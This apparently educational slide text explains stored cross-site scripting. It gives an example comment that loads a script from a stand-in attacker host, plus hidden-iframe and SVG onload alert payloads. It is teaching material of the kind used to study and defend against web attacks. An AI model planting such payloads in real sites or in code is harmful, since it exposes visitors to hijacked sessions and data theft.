XSS Type 2

Stored XSS: Persistent and Dangerous

Malicious Scripts Permanently Stored on the Server

Persistent Storage

The malicious script is permanently stored on the target server, often in a database, comment section, or user profile.

No User Interaction Needed

Once stored, simply visiting the compromised page is enough for the victim's browser to retrieve and execute the script.

Example Scenario

An attacker posts a comment like <script src="http://attacker.com/malicious.js"></script>. Every user viewing the post executes the script.

Payload Example

<iframe src="javascript:alert('XSS')" width="0" height="0"></iframe> for a hidden execution, or <svg/onload=alert(document.domain)>.

Key Takeaway

Stored XSS is the most dangerous type, as malicious scripts are permanently saved on the server and automatically executed by victims.
